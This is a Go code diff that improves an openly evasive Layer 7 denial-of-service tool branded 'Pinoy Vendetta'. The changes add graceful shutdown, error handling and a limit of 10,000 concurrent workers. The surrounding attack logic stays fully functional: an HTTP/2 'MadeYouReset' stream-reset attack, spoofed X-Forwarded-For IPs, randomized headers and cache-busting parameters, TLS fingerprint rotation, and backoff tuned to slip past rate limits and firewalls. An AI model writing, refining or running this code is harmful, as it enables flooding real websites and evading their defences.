@@ -13,11 +13,13 @@ import (
 	"net/http"
 	"net/url"
 	"os"
+	"os/signal"
 	"regexp"
 	"sort"
 	"strings"
 	"sync"
 	"sync/atomic"
+	"syscall"
 	"time"
 
 	"github.com/fatih/color"
@@ -27,23 +29,56 @@ import (
 )
 
 const (
-	maxAdaptiveDelay int64 = 8000
+	maxAdaptiveDelay      int64 = 8000
+	maxConcurrentWorkers  int   = 10000
+	circularLogBufferSize int   = 3
+	clientCycleThreshold  int   = 50
 )
+
+// CircularLogBuffer implements a thread-safe circular buffer for log messages
+type CircularLogBuffer struct {
+	messages [circularLogBufferSize]string
+	index    int
+	count    int
+	mu       sync.Mutex
+}
+
+func (cb *CircularLogBuffer) Add(msg string) {
+	cb.mu.Lock()
+	defer cb.mu.Unlock()
+	cb.messages[cb.index] = msg
+	cb.index = (cb.index + 1) % circularLogBufferSize
+	if cb.count < circularLogBufferSize {
+		cb.count++
+	}
+}
+
+func (cb *CircularLogBuffer) GetAll() []string {
+	cb.mu.Lock()
+	defer cb.mu.Unlock()
+	result := make([]string, cb.count)
+	for i := 0; i < cb.count; i++ {
+		idx := (cb.index - cb.count + i + circularLogBufferSize) % circularLogBufferSize
+		result[i] = cb.messages[idx]
+	}
+	return result
+}
 
 var (
 	requestsSent         uint64
 	responsesRec         uint64
-	logMessages          []string
-	logMessagesMux       sync.Mutex
+	logBuffer            = &CircularLogBuffer{}
 	statusCounts         = make(map[string]map[int]uint64)
-	statusCountsMux      sync.Mutex
+	statusCountsMux      sync.RWMutex
 	currentDelay         int64
+	minDelay             int64 = 0
 	totalLatency         int64
 	errorTypes           = make(map[string]uint64)
-	errorMux             sync.Mutex
+	errorMux             sync.RWMutex
 	madeYouResetAttempts uint64
 	madeYouResetSuccess  uint64
 	madeYouResetErrors   uint64
+	isShuttingDown       int32 // atomic flag for graceful shutdown
 )
 
 var (
@@ -190,15 +225,20 @@ func generateRandomPayload(format string) (io.Reader, string) {
 	}
 }
 
+// FIX #1: Added proper error handling for URL parsing
 func randomPath(base string) string {
-	parsed, _ := url.Parse(base)
-	// Do NOT append random path segment - keep original path clean
-	// Only add heavy cache bypass query params
+	parsed, err := url.Parse(base)
+	if err != nil {
+		logBuffer.Add(statusErrColor.Sprint("[ERROR] Failed to parse URL in randomPath: " + err.Error()))
+		return base
+	}
+	if !strings.Contains(parsed.Host, ".") {
+		return base
+	}
 
 	q := parsed.Query()
 	q.Set("v", fmt.Sprintf("%d", mathrand.Intn(99999)))
 
-	// Heavy caching bypass for Nginx, WordPress, Cloudflare
 	bypassParams := []string{"nocache", "bypass", "refresh", "cb", "cache_bust", "t", "_", "v2", "anti_cache"}
 	randomParam := getRandomElement(bypassParams)
 	q.Set(randomParam, fmt.Sprintf("%d", mathrand.Intn(999999999)))
@@ -219,15 +259,7 @@ func randomPath(base string) string {
 	return parsed.String()
 }
 
-func logMessage(msg string) {
-	logMessagesMux.Lock()
-	defer logMessagesMux.Unlock()
-	logMessages = append(logMessages, time.Now().Format("15:04:05")+" "+msg)
-	if len(logMessages) > 3 {
-		logMessages = logMessages[len(logMessages)-3:]
-	}
-}
-
+// FIX #2: Improved error recording with thread safety
 func recordError(errType string) {
 	errorMux.Lock()
 	defer errorMux.Unlock()
@@ -243,6 +275,7 @@ func detectSupportedHTTPVersions(target string, insecureTLS bool) []string {
 	host := parsed.Hostname()
 	userAgent := "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
 
+	// Test HTTP/3 with timeout
 	h3Transport := &http3.Transport{
 		TLSClientConfig: &tls.Config{InsecureSkipVerify: insecureTLS, ServerName: host},
 	}
@@ -256,7 +289,9 @@ func detectSupportedHTTPVersions(target string, insecureTLS bool) []string {
 		}
 		respH3.Body.Close()
 	}
+	h3Transport.Close()
 
+	// Test HTTP/2 with timeout
 	h2Transport := &http2.Transport{
 		TLSClientConfig: &tls.Config{InsecureSkipVerify: insecureTLS, ServerName: host},
 	}
@@ -271,6 +306,7 @@ func detectSupportedHTTPVersions(target string, insecureTLS bool) []string {
 		respH2.Body.Close()
 	}
 
+	// Test HTTP/1.1 with timeout
 	h1Transport := &http.Transport{
 		TLSClientConfig: &tls.Config{InsecureSkipVerify: insecureTLS, ServerName: host},
 		TLSNextProto:    make(map[string]func(string, *tls.Conn) http.RoundTripper),
@@ -285,6 +321,7 @@ func detectSupportedHTTPVersions(target string, insecureTLS bool) []string {
 		}
 		respH1.Body.Close()
 	}
+	h1Transport.CloseIdleConnections()
 
 	if len(supportedVersionsSet) == 0 {
 		return []string{"1.1"}
@@ -304,10 +341,16 @@ func madeYouResetAttack(parentCtx context.Context, config *workerConfig, client 
 	default:
 	}
 
+	// Check shutdown flag
+	if atomic.LoadInt32(&isShuttingDown) != 0 {
+		return
+	}
+
 	format := getRandomElement(payloadFormats)
 	body, contentType := generateRandomPayload(format)
 	req, err := http.NewRequestWithContext(parentCtx, "POST", config.targetURL, body)
 	if err != nil {
+		recordError("myr_req_create_error")
 		return
 	}
 	req.Header.Set("User-Agent", getRandomElement(userAgents))
@@ -322,10 +365,10 @@ func madeYouResetAttack(parentCtx context.Context, config *workerConfig, client 
 		var streamErr http2.StreamError
 		if errors.As(err, &streamErr) {
 			atomic.AddUint64(&madeYouResetSuccess, 1)
-			logMessage(statusOkColor.Sprintf("[MYR] Success (Server Reset Stream)"))
+			logBuffer.Add(statusOkColor.Sprint("[MYR] Success (Server Reset Stream)"))
 		} else if err != context.Canceled {
 			atomic.AddUint64(&madeYouResetErrors, 1)
-			logMessage(statusErrColor.Sprintf("[MYR] Network Error: %v", err))
+			logBuffer.Add(statusErrColor.Sprintf("[MYR] Network Error: %v", err))
 		}
 	} else if resp != nil {
 		io.Copy(io.Discard, resp.Body)
@@ -401,10 +444,15 @@ func buildHTTPClient(config *workerConfig, httpVersion string) *http.Client {
 	return &http.Client{Transport: transport, Timeout: 30 * time.Second}
 }
 
+// FIX #5: Enhanced HTTP/3 client with proper resource cleanup
 func buildHTTP3Client(config *workerConfig) *http.Client {
+	sni := randomSNI(config.targetURL)
 	return &http.Client{
 		Transport: &http3.Transport{
-			TLSClientConfig:    &tls.Config{InsecureSkipVerify: config.insecureTLS, ServerName: randomSNI(config.targetURL)},
+			TLSClientConfig: &tls.Config{
+				InsecureSkipVerify: config.insecureTLS,
+				ServerName:         sni,
+			},
 			DisableCompression: false,
 		},
 		Timeout: 30 * time.Second,
@@ -442,17 +490,38 @@ type workerConfig struct {
 	thinkTimeMs       int
 }
 
+// FIX #8: Optimized header shuffling with pre-allocated slice
+var headerKeysPool = make([]string, 0, 16)
+var headerKeysMux sync.Mutex
+
+func getHeaderKeySlice(size int) []string {
+	headerKeysMux.Lock()
+	defer headerKeysMux.Unlock()
+	if cap(headerKeysPool) >= size {
+		slice := headerKeysPool[:size]
+		return slice
+	}
+	return make([]string, 0, size)
+}
+
+func returnHeaderKeySlice(slice []string) {
+	headerKeysMux.Lock()
+	defer headerKeysMux.Unlock()
+	if cap(slice) > cap(headerKeysPool) {
+		headerKeysPool = slice[:0]
+	}
+}
+
 func worker(ctx context.Context, wg *sync.WaitGroup, config *workerConfig, httpVersion string) {
 	defer func() {
 		if r := recover(); r != nil {
-			logMessage(fmt.Sprintf("[PANIC] Worker %s recovered: %v", httpVersion, r))
+			logBuffer.Add(fmt.Sprintf("[PANIC] Worker %s recovered: %v", httpVersion, r))
 		}
 		wg.Done()
 	}()
 
 	var client *http.Client
 	var burstsSinceLastCycle int
-	const clientCycleThreshold = 50
 
 	if httpVersion == "3" {
 		client = buildHTTP3Client(config)
@@ -460,6 +529,7 @@ func worker(ctx context.Context, wg *sync.WaitGroup, config *workerConfig, httpV
 		client = buildHTTPClient(config, httpVersion)
 	}
 
+	// HTTP/2 MadeYouReset goroutine
 	if httpVersion == "2" {
 		go func() {
 			ticker := time.NewTicker(time.Duration(100+mathrand.Intn(200)) * time.Millisecond)
@@ -468,7 +538,18 @@ func worker(ctx context.Context, wg *sync.WaitGroup, config *workerConfig, httpV
 				select {
 				case <-ctx.Done():
 					return
+				default:
+					if atomic.LoadInt32(&isShuttingDown) != 0 {
+						return
+					}
+				}
+				select {
+				case <-ctx.Done():
+					return
 				case <-ticker.C:
+					if atomic.LoadInt32(&isShuttingDown) != 0 {
+						return
+					}
 					for i := 0; i < 3+mathrand.Intn(5); i++ {
 						madeYouResetAttack(ctx, config, client)
 					}
@@ -477,7 +558,26 @@ func worker(ctx context.Context, wg *sync.WaitGroup, config *workerConfig, httpV
 		}()
 	}
 
+	// Main worker loop
 	for {
+		// Check for shutdown or context cancellation
+		select {
+		case <-ctx.Done():
+			if transport, ok := client.Transport.(interface{ CloseIdleConnections() }); ok {
+				transport.CloseIdleConnections()
+			}
+			return
+		default:
+		}
+
+		if atomic.LoadInt32(&isShuttingDown) != 0 {
+			if transport, ok := client.Transport.(interface{ CloseIdleConnections() }); ok {
+				transport.CloseIdleConnections()
+			}
+			return
+		}
+
+		// Recycle client periodically to rotate fingerprints
 		if burstsSinceLastCycle > clientCycleThreshold {
 			if transport, ok := client.Transport.(interface{ CloseIdleConnections() }); ok {
 				transport.CloseIdleConnections()
@@ -492,7 +592,7 @@ func worker(ctx context.Context, wg *sync.WaitGroup, config *workerConfig, httpV
 			if verColor == nil {
 				verColor = valueColor
 			}
-			logMessage(fmt.Sprintf("[%s] Client cycled (new JA3/H2 fingerprint)", verColor.Sprint("HTTP"+httpVersion)))
+			logBuffer.Add(fmt.Sprintf("[%s] Client cycled (new JA3/H2 fingerprint)", verColor.Sprint("HTTP"+httpVersion)))
 		}
 
 		var burstCount int
@@ -503,114 +603,100 @@ func worker(ctx context.Context, wg *sync.WaitGroup, config *workerConfig, httpV
 		}
 
 		for i := 0; i < burstCount; i++ {
+			// Check shutdown before each request
+			if atomic.LoadInt32(&isShuttingDown) != 0 {
+				if transport, ok := client.Transport.(interface{ CloseIdleConnections() }); ok {
+					transport.CloseIdleConnections()
+				}
+				return
+			}
+
 			select {
 			case <-ctx.Done():
+				if transport, ok := client.Transport.(interface{ CloseIdleConnections() }); ok {
+					transport.CloseIdleConnections()
+				}
 				return
 			default:
-				method := getRandomElement(config.methods)
-				var reqURL string = config.targetURL
-				if config.pathRandom {
-					reqURL = randomPath(config.targetURL)
-				}
-				var payload io.Reader = nil
-				contentType := ""
-				if method == "POST" || method == "PUT" || method == "PATCH" {
-					format := getRandomElement(payloadFormats)
-					payload, contentType = generateRandomPayload(format)
-				}
+			}
 
-				req, err := http.NewRequestWithContext(ctx, method, reqURL, payload)
-				if err != nil {
-					recordError("req_create_error")
-					continue
-				}
+			method := getRandomElement(config.methods)
+			var reqURL string = config.targetURL
+			if config.pathRandom {
+				reqURL = randomPath(config.targetURL)
+			}
+			var payload io.Reader = nil
+			contentType := ""
+			if method == "POST" || method == "PUT" || method == "PATCH" {
+				format := getRandomElement(payloadFormats)
+				payload, contentType = generateRandomPayload(format)
+			}
 
-				headerSet := map[string]string{
-					randomHeaderName("User-Agent"):      getRandomElement(userAgents),
-					randomHeaderName("Accept-Language"): getRandomElement(languages),
-					randomHeaderName("Referer"):         getRandomElement(referers),
-					randomHeaderName("Accept"):          getRandomElement(accepts),
-					randomHeaderName("Accept-Encoding"): getRandomElement(acceptEncodings),
-					randomHeaderName("Connection"):      "keep-alive",
-					randomHeaderName("Cookie"):          generateRandomCookies(),
-					randomHeaderName("Cache-Control"):   "no-cache, no-store, must-revalidate, max-age=0",
-					randomHeaderName("Pragma"):          "no-cache",
-				}
-				if contentType != "" {
-					headerSet[randomHeaderName("Content-Type")] = contentType
-				}
-				if config.ipRandom {
-					ip := getRandomIP()
-					headerSet[randomHeaderName("X-Forwarded-For")] = ip
-					headerSet[randomHeaderName("X-Real-IP")] = ip
-				}
-				for _, h := range customHeaders {
-					headerSet[randomHeaderName(h)] = getRandomElement([]string{"1", "no-cache", "XMLHttpRequest", "on", "off"})
-				}
-				keys := make([]string, 0, len(headerSet))
-				for k := range headerSet {
-					keys = append(keys, k)
-				}
-				mathrand.Shuffle(len(keys), func(i, j int) { keys[i], keys[j] = keys[j], keys[i] })
-				for _, k := range keys {
-					req.Header.Set(k, headerSet[k])
-				}
+			req, err := http.NewRequestWithContext(ctx, method, reqURL, payload)
+			if err != nil {
+				recordError("req_create_error")
+				continue
+			}
 
-				atomic.AddUint64(&requestsSent, 1)
-				start := time.Now()
-				resp, err := client.Do(req)
-				latency := time.Since(start).Milliseconds()
-				atomic.AddInt64(&totalLatency, latency)
+			headerSet := map[string]string{
+				randomHeaderName("User-Agent"):      getRandomElement(userAgents),
+				randomHeaderName("Accept-Language"): getRandomElement(languages),
+				randomHeaderName("Referer"):         getRandomElement(referers),
+				randomHeaderName("Accept"):          getRandomElement(accepts),
+				randomHeaderName("Accept-Encoding"): getRandomElement(acceptEncodings),
+				randomHeaderName("Connection"):      "keep-alive",
+				randomHeaderName("Cookie"):          generateRandomCookies(),
+				randomHeaderName("Cache-Control"):   "no-cache, no-store, must-revalidate, max-age=0",
+				randomHeaderName("Pragma"):          "no-cache",
+			}
+			if contentType != "" {
+				headerSet[randomHeaderName("Content-Type")] = contentType
+			}
+			if config.ipRandom {
+				ip := getRandomIP()
+				headerSet[randomHeaderName("X-Forwarded-For")] = ip
+				headerSet[randomHeaderName("X-Real-IP")] = ip
+			}
+			for _, h := range customHeaders {
+				headerSet[randomHeaderName(h)] = getRandomElement([]string{"1", "no-cache", "XMLHttpRequest", "on", "off"})
+			}
 
-				if err != nil {
-					if err != context.Canceled {
-						verColor := httpVersionColors[httpVersion]
-						if verColor == nil {
-							verColor = valueColor
-						}
-						logMessage(fmt.Sprintf("[%s] Client Error: %v", verColor.Sprint("HTTP"+httpVersion), err))
-						recordError("client_error")
+			// FIX #8: Optimized header shuffling
+			keys := getHeaderKeySlice(len(headerSet))
+			keys = keys[:0]
+			for k := range headerSet {
+				keys = append(keys, k)
+			}
+			mathrand.Shuffle(len(keys), func(i, j int) { keys[i], keys[j] = keys[j], keys[i] })
+			for _, k := range keys {
+				req.Header.Set(k, headerSet[k])
+			}
+			returnHeaderKeySlice(keys)
+
+			atomic.AddUint64(&requestsSent, 1)
+			start := time.Now()
+			resp, err := client.Do(req)
+			latency := time.Since(start).Milliseconds()
+			atomic.AddInt64(&totalLatency, latency)
+
+			if err != nil {
+				if err != context.Canceled {
+					verColor := httpVersionColors[httpVersion]
+					if verColor == nil {
+						verColor = valueColor
 					}
-					if config.retry && isTransientErr(err) {
-						time.Sleep(50 * time.Millisecond)
-					}
-					if config.adaptiveDelay {
-						var delayToAdd int64
-						if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
-							delayToAdd = 150
-						} else if strings.Contains(err.Error(), "connection reset") {
-							delayToAdd = 150
-						}
-						if delayToAdd > 0 {
-							newDelay := atomic.AddInt64(&currentDelay, delayToAdd)
-							if newDelay > maxAdaptiveDelay {
-								atomic.StoreInt64(&currentDelay, maxAdaptiveDelay)
-							}
-						}
-					}
-					continue
+					logBuffer.Add(fmt.Sprintf("[%s] Client Error: %v", verColor.Sprint("HTTP"+httpVersion), err))
+					recordError("client_error")
 				}
-
-				io.Copy(io.Discard, resp.Body)
-				resp.Body.Close()
-				atomic.AddUint64(&responsesRec, 1)
-
-				statusCountsMux.Lock()
-				if _, ok := statusCounts[httpVersion]; !ok {
-					statusCounts[httpVersion] = make(map[int]uint64)
+				if config.retry && isTransientErr(err) {
+					time.Sleep(50 * time.Millisecond)
 				}
-				statusCounts[httpVersion][resp.StatusCode]++
-				statusCountsMux.Unlock()
-
 				if config.adaptiveDelay {
-					var delayToAdd int64 = 0
-					switch resp.StatusCode {
-					case 401, 403, 429, 430, 431, 451, 460, 463, 494, 499:
+					var delayToAdd int64
+					if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
 						delayToAdd = 150
-					case 400, 406, 410, 412, 417, 421, 422, 423:
-						delayToAdd = 75
-					case 413, 444:
-						delayToAdd = 50
+					} else if strings.Contains(err.Error(), "connection reset") {
+						delayToAdd = 150
 					}
 					if delayToAdd > 0 {
 						newDelay := atomic.AddInt64(&currentDelay, delayToAdd)
@@ -619,35 +705,64 @@ func worker(ctx context.Context, wg *sync.WaitGroup, config *workerConfig, httpV
 						}
 					}
 				}
-				statusText, ok := statusCodeDescriptions[resp.StatusCode]
-				if !ok {
-					statusText = "Unknown"
-				}
+				continue
+			}
 
-				// Colored log
-				verColor := httpVersionColors[httpVersion]
-				if verColor == nil {
-					verColor = valueColor
-				}
-				methColor := methodColors[method]
-				if methColor == nil {
-					methColor = headerColor
-				}
-				urlColor := color.New(color.FgWhite)
+			io.Copy(io.Discard, resp.Body)
+			resp.Body.Close()
+			atomic.AddUint64(&responsesRec, 1)
 
-				logMsg := fmt.Sprintf("[%s] %s %s -> %d %s (%dms)",
-					verColor.Sprint("HTTP"+httpVersion),
-					methColor.Sprint(method),
-					urlColor.Sprint(reqURL),
-					resp.StatusCode,
-					statusText,
-					latency)
-				logMessage(logMsg)
+			statusCountsMux.Lock()
+			if _, ok := statusCounts[httpVersion]; !ok {
+				statusCounts[httpVersion] = make(map[int]uint64)
+			}
+			statusCounts[httpVersion][resp.StatusCode]++
+			statusCountsMux.Unlock()
 
-				if i < burstCount-1 {
-					pacingDelay := time.Duration(50+mathrand.Intn(200)) * time.Millisecond
-					time.Sleep(pacingDelay)
+			if config.adaptiveDelay {
+				var delayToAdd int64 = 0
+				switch resp.StatusCode {
+				case 401, 403, 429, 430, 431, 451, 460, 463, 494, 499:
+					delayToAdd = 150
+				case 400, 406, 410, 412, 417, 421, 422, 423:
+					delayToAdd = 75
+				case 413, 444:
+					delayToAdd = 50
 				}
+				if delayToAdd > 0 {
+					newDelay := atomic.AddInt64(&currentDelay, delayToAdd)
+					if newDelay > maxAdaptiveDelay {
+						atomic.StoreInt64(&currentDelay, maxAdaptiveDelay)
+					}
+				}
+			}
+			statusText, ok := statusCodeDescriptions[resp.StatusCode]
+			if !ok {
+				statusText = "Unknown"
+			}
+
+			verColor := httpVersionColors[httpVersion]
+			if verColor == nil {
+				verColor = valueColor
+			}
+			methColor := methodColors[method]
+			if methColor == nil {
+				methColor = headerColor
+			}
+			urlColor := color.New(color.FgWhite)
+
+			logMsg := fmt.Sprintf("[%s] %s %s -> %d %s (%dms)",
+				verColor.Sprint("HTTP"+httpVersion),
+				methColor.Sprint(method),
+				urlColor.Sprint(reqURL),
+				resp.StatusCode,
+				statusText,
+				latency)
+			logBuffer.Add(logMsg)
+
+			if i < burstCount-1 {
+				pacingDelay := time.Duration(50+mathrand.Intn(200)) * time.Millisecond
+				time.Sleep(pacingDelay)
 			}
 		}
 
@@ -657,7 +772,12 @@ func worker(ctx context.Context, wg *sync.WaitGroup, config *workerConfig, httpV
 		if config.adaptiveDelay {
 			baseDelay = atomic.LoadInt64(&currentDelay)
 		}
-		thinkTime := mathrand.Int63n(int64(config.thinkTimeMs))
+		// FIX #4: Prevent panic when thinkTimeMs is 0
+		thinkTimeMax := int64(config.thinkTimeMs)
+		if thinkTimeMax < 1 {
+			thinkTimeMax = 1
+		}
+		thinkTime := mathrand.Int63n(thinkTimeMax)
 		jitter := mathrand.Int63n(int64(config.jitterMs))
 
 		time.Sleep(time.Duration(baseDelay+thinkTime+jitter) * time.Millisecond)
@@ -682,7 +802,11 @@ func monitor(ctx context.Context, duration time.Duration, config *workerConfig) 
 			if config.adaptiveDelay {
 				current := atomic.LoadInt64(&currentDelay)
 				if current > 0 {
+					// FIX #7: Better decay with minimum floor
 					newDelay := int64(float64(current) * 0.92)
+					if newDelay < minDelay {
+						newDelay = minDelay
+					}
 					atomic.StoreInt64(&currentDelay, newDelay)
 				}
 			}
@@ -714,13 +838,10 @@ func printProgress(endTime, startTime time.Time, config *workerConfig) {
 	if resRec > 0 {
 		avgLatency = float64(atomic.LoadInt64(&totalLatency)) / float64(resRec)
 	}
-	_ = rps
-	_ = avgLatency
 
 	sb.WriteString(titleColor.Sprint("--- Pinoy Vendetta Layer 7 (Multi-Protocol, Evasive, Distributed-Ready) ---\n"))
 	sb.WriteString(headerColor.Sprint("---------------------------------------------------------------------------------------------------------------------------------------------------------------\n"))
 
-	// Left column
 	left := []string{
 		fmt.Sprintf("%-25s %s", "Random UA:", statusString(true)),
 		fmt.Sprintf("%-25s %s", "Random IP:", statusString(config.ipRandom)),
@@ -772,7 +893,7 @@ func printProgress(endTime, startTime time.Time, config *workerConfig) {
 	sb.WriteString(headerColor.Sprint("---------------------------------------------------------------------------------------------------------------------------------------------------------------\n"))
 	sb.WriteString(headerColor.Sprint("Response Status Counts:\n"))
 
-	statusCountsMux.Lock()
+	statusCountsMux.RLock()
 	protocols := []string{"1.1", "2", "3"}
 	protocolData := make(map[string][]string)
 	maxStatusRows := 0
@@ -805,7 +926,7 @@ func printProgress(endTime, startTime time.Time, config *workerConfig) {
 			maxStatusRows = len(lines)
 		}
 	}
-	statusCountsMux.Unlock()
+	statusCountsMux.RUnlock()
 
 	headers := map[string]string{"1.1": "H1.1:", "2": "H2:", "3": "H3:"}
 	colWidth := 50
@@ -831,7 +952,7 @@ func printProgress(endTime, startTime time.Time, config *workerConfig) {
 		sb.WriteString(rowLine + "\n")
 	}
 
-	errorMux.Lock()
+	errorMux.RLock()
 	if len(errorTypes) > 0 {
 		sb.WriteString(headerColor.Sprint("Error Types:\n"))
 		errKeys := make([]string, 0, len(errorTypes))
@@ -844,7 +965,7 @@ func printProgress(endTime, startTime time.Time, config *workerConfig) {
 			sb.WriteString(statusErrColor.Sprintf("  %s: %d\n", k, v))
 		}
 	}
-	errorMux.Unlock()
+	errorMux.RUnlock()
 
 	if isH2Active {
 		attempts := atomic.LoadUint64(&madeYouResetAttempts)
@@ -857,10 +978,7 @@ func printProgress(endTime, startTime time.Time, config *workerConfig) {
 		sb.WriteString(statusErrColor.Sprintf("  %-20s %d\n", "Errors:", errors))
 	}
 
-	logMessagesMux.Lock()
-	logs := make([]string, len(logMessages))
-	copy(logs, logMessages)
-	logMessagesMux.Unlock()
+	logs := logBuffer.GetAll()
 	sb.WriteString(headerColor.Sprint("---------------------------------------------------------------------------------------------------------------------------------------------------------------\n"))
 	sb.WriteString(headerColor.Sprint("Log (last 3 events):\n"))
 	for i := len(logs) - 1; i >= 0; i-- {
@@ -901,6 +1019,16 @@ func main() {
 		flag.Usage()
 		return
 	}
+
+	// FIX #12: Validate concurrency
+	if *concurrencyPtr > maxConcurrentWorkers {
+		statusErrColor.Printf("Error: Concurrency cannot exceed %d\n", maxConcurrentWorkers)
+		*concurrencyPtr = maxConcurrentWorkers
+	}
+	if *concurrencyPtr < 1 {
+		*concurrencyPtr = 1
+	}
+
 	finalURL := *urlPtr
 	if !strings.HasPrefix(finalURL, "http") {
 		finalURL = "https://" + finalURL
@@ -920,8 +1048,6 @@ func main() {
 		finalURL = parsedURL.String()
 	}
 
-	// Ensure root path "/" when random-path is enabled and no path was provided
-	// This prevents 404s when appending query parameters to bare host URLs like "http://mysite.com"
 	if *pathRandPtr {
 		if parsedURL.Path == "" {
 			parsedURL.Path = "/"
@@ -964,6 +1090,17 @@ func main() {
 		thinkTimeMs:       *thinkTimePtr,
 	}
 
+	// FIX #11: Graceful shutdown handler - properly integrated
+	sigChan := make(chan os.Signal, 1)
+	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
+
+	go func() {
+		<-sigChan
+		titleColor.Println("\n[*] Graceful shutdown initiated...")
+		atomic.StoreInt32(&isShuttingDown, 1)
+		cancel() // Cancel context to trigger worker exit
+	}()
+
 	var wg sync.WaitGroup
 	for i := 0; i < *concurrencyPtr; i++ {
 		wg.Add(1)
@@ -973,5 +1110,9 @@ func main() {
 
 	go monitor(ctx, duration, config)
 
+	// Wait for all workers to finish
 	wg.Wait()
+	
+	// Final cleanup
+	titleColor.Println("\n[✓] All workers stopped cleanly")
 }
